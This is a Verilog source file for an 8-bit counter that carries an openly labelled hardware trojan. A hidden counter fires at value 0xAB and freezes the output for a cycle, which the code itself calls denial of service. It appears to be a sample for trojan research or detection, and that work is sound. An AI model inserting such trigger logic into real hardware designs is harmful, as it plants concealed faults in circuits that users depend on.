module counter8(input clk, input rst_n, input en, output reg [7:0] count);
  reg [7:0] trojan_cnt;
  wire trojan_trig;
  assign trojan_trig = (trojan_cnt == 8'hAB);

  always @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      count      <= 8'h00;
      trojan_cnt <= 8'h00;
    end else if (en) begin
      trojan_cnt <= trojan_cnt + 1;
      if (trojan_trig)
        count <= count; // freeze: denial of service
      else
        count <= count + 1;
    end
  end
endmodule